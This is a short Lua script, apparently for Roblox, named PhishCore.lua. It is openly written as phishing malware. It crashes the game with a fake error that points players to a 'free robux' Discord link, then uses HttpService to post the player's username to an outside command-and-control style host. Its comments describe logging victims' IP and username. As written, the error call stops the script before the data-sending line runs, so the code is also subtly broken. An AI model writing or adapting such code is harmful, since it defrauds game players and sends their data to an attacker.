-- PhishCore.lua (obfuscated to hell)  
local function CrashAndPhish()  
    -- Step 1: Crash the game with a fake error  
    error("⚠️ Failed to link autofarm! Visit [discord.gg/freerobux] to fix!")  
    -- Step 2: Log their IP & username to my server  
    game:GetService("HttpService"):PostAsync("https://phantomc2[.]net/log", game.Players.LocalPlayer.Name)  
end  
CrashAndPhish()  
